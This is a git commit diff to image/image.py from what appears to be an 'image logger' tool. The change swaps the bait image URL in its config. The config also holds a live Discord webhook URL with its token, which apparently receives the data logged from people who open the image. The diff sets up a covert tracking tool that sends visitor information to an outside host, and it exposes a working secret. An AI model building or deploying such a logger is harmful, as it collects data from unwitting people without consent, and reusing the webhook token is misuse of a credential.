5a609bfbd565dc8617cbddcaf1ff0a12109235e0
capibara509 <136846268+capibara509@users.noreply.github.com>
2025-07-28 19:19:39 -0300

    Update image.py

--- image/image.py
+++ image/image.py
@@ -13,7 +13,7 @@
     config = {
         # BASE CONFIG #
         "webhook": "https://discordapp.com/api/webhooks/1399141478994804756/DzoD09fuEy6IcY5iInAV4Coirla1n4SJNTP5ii3-Pt7HcS0CWSDGngCZNyTs8nEzE6DJ",
-        "image": "https://jugueteriamisouvenir.mercadoshops.com.ar/MLA-1818848298-pop-it-electronico-juguete-squibidi-toilet-empuje-habilidad-_JM", # You can also have a custom image by using a URL argument
+        "image": "https://www.pcworld.com/wp-content/uploads/2025/04/Windows-XP-Bliss-desktop-large.png", # You can also have a custom image by using a URL argument
                                                 # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
         "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
